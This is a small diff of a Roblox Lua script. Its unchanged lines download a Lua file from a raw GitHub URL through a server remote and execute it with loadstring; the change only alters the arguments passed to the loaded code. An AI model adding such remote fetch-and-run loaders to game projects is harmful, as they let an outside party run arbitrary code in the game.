@@ -110,9 +110,9 @@ print("ui stuff:", forcingthechat, run, player, message, playere)
 		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
 		local loadstrng = game:GetService("ReplicatedStorage"):WaitForChild("gethttp", 99999):InvokeServer("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/l.lua")
 
-		local localscripts = loadstring(loadstrng)(forcingthechat, run, player, message)
+		local localscripts = loadstring(loadstrng)(...)
 
-		localscripts.init(forcingthechat, run, player, message)
+		localscripts.init(...)
 	]]
 
     serverscripts.init(forcingthechat)
